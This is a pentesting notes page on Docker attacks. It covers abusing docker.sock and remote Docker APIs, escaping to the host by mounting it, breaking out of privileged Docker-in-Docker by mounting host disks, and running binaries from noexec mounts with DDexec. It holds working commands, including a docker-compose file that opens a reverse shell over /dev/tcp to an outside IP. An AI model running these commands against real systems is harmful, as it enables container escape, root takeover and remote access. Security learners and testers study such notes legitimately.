---
description: Use containers to run applications in a reproducible and isolated environment
---

# Docker

Docker allows you to build and run containers that hold an application in an isolated environment, similar to a Virtual Machine. This is done with Linux namespaces, however, making it much more lightweight than VMs.&#x20;

It should normally be impossible to escape to the host system from inside a container. While it may still be possible to reach into the internal network over regular network protocols, access to the host's filesystem and processes is restricted. There are, however, some misconfigurations that be exploited by attackers to get more access than expected, often targeting the host from inside the container.&#x20;

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation" %}
Escaping docker with many different misconfigurations
{% endembed %}

Below are some more tricks that I've personally found useful.

## Docker Access

In some cases, you may be able to access the `docker.sock` socket or TCP ports 2375/2376 for the Docker API. This API does all the interaction with the host system. Through this, it is possible to start new containers with extra privileges and access through mounts.

### Connecting

If you find yourself as a low-privilege user on a machine with Docker installed, and you have the `docker` group, you should be able to successfully run the following command. Check out [#privilege-escalation](docker.md#privilege-escalation "mention") to abuse this to get `root` access.

```sh
docker version
```

The `-H` option with the `unix://` protocol allows you to connect to a mounted `docker.sock` socket somewhere on the filesystem if it is available:

```sh
docker -H unix:///path/to/docker.sock version
```

**For remote Docker APIs**, a host can be specified with `-H` on your local `docker` installation to run commands on another instance. Below is an example of an unencrypted connection to port 2375:

```sh
docker -H=10.10.10.10:2375 version
```

When **TLS** is required, just use port 2376 and `--tls`:

```sh
docker --tls -H=10.10.10.10:2376 version
```

As recommended, TLS servers may require a **client certificate** for authentication. If you have this, specify it with the `--tlscert` and `--tlskey` options:

```sh
docker --tls --tlscert=client.pem --tlskey=client-key.pem -H=10.10.10.10:2376 version
```

### Privilege Escalation

Interactive from `docker run` by mounting host:

```sh
docker run -it -v /:/host ubuntu chroot /host bash
```

Reverse shell using `docker-compose` by mounting host:

{% code title="docker-compose.yml" %}
```yaml
services:
  exploit:
    image: ubuntu
    command: "chroot /host bash -c 'bash -i >& /dev/tcp/10.10.10.10/1337 0>&1'"
    volumes:
      - /:/host

# docker-compose up
```
{% endcode %}

### Docker in Docker (DinD)

Using the [`docker:dind`](https://hub.docker.com/\_/docker/tags?name=dind) image, it is possible to run a nested Docker engine inside another Docker container. This allows applications that require starting docker containers to communicate with an isolated environment without requiring to talk with the host system directly.&#x20;

A simple working setup of this can be seen below:

<details>

<summary>Testing setup</summary>

Set up the following compose file with `docker-compose up`:

{% code title="docker-compose.yml" %}
```yaml
services:
  shell:
    image: docker:latest
    command: sleep infinity
    environment:
      DOCKER_TLS_VERIFY: 1
      DOCKER_HOST: tcp://docker:2376
      DOCKER_CERT_PATH: /certs/client
    volumes:
      - some-docker-certs-client:/certs/client
  docker:
    image: docker:dind
    privileged: true
    environment:
      DOCKER_TLS_CERTDIR: /certs
    volumes:
      - some-docker-certs-ca:/certs/ca
      - some-docker-certs-client:/certs/client

volumes:
  some-docker-certs-ca:
  some-docker-certs-client:
```
{% endcode %}

Then, use the command below to enter a shell in the unprivileged `shell` container:

```sh
docker exec -it dind_shell_1 sh
```

From here, use commands like `docker version` to interact with the `dind` container.

</details>

Making this work requires the `--privileged` flag to be set for the `dind` container, giving it more access to the host system than regular containers. We will abuse this, but first, we can use the techniques from [#privilege-escalation](docker.md#privilege-escalation "mention") to start a new container on the remote Docker API (DinD). \
Note that we also provide `--privileged` here to maintain the access:

{% code title="Escalate to Docker API" %}
```sh
docker run -it -v /:/host --privileged ubuntu chroot /host sh
```
{% endcode %}

When inside we should have access as if we are on the `dind` container itself. Because it is privileged, we can mount disks like `/dev/sda` to read and write to them. These disks come from the real host:

{% code title="Mount all disks" %}
```bash
for disk in /dev/sd*; do
    mnt=/mnt/$(basename $disk)
    mkdir -p $mnt
    mount $disk $mnt
done
```
{% endcode %}

The above may generate some "Invalid argument" messages, but all possible disks should now be mounted in `/mnt`. Look for the host system here and do anything with the newfound access to its files.

## Filesystem Protections

If you gain access to a container via some vulnerability, it might be hardened with some protections on the filesystem. A common one is "read-only file system" when writing anywhere.&#x20;

Regular directories under `/` will not be writable, but there is often one exception: `/dev/shm`. This special directory is stored in RAM instead of disk and is thus always writable. While it sounds perfect, it is commonly protected with a `noexec` flag disallowing any ELF binaries from executing inside this directory. Running `./pspy`, for example, won't work.

It is still possible to execute any bash code, however, and some clever people have abused this. By writing bash code that injects some ELF binary's logic into another process, it is possible to run a binary stored in `/dev/shm` without actually executing it. The repository below implements this:

{% embed url="https://github.com/arget13/DDexec" %}
Run any ELF binary from a `noexec` location by injecting it as shellcode
{% endembed %}

After uploading this shell script to the target together with your binary, run it with any arguments:

```sh
base64 -w0 pspy | bash ddexec.sh pspy ...
```

### Distroless RCE

In an ever more restricted scenario, your container will not even have common shells like `sh` or `ash`. It might only have the programming language required to run the application installed. While a regular reverse shell is impossible here, it is often possible to use the programming language to load shellcode similarly to DDexec. By running binaries such as `busybox`, many commands can be brought back to enumerate the system in this restricted environment.

Check out the following video for more information about exploiting this:

["DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion - Polop, Gutierrez"](https://www.youtube.com/watch?v=poHirez8jk4)
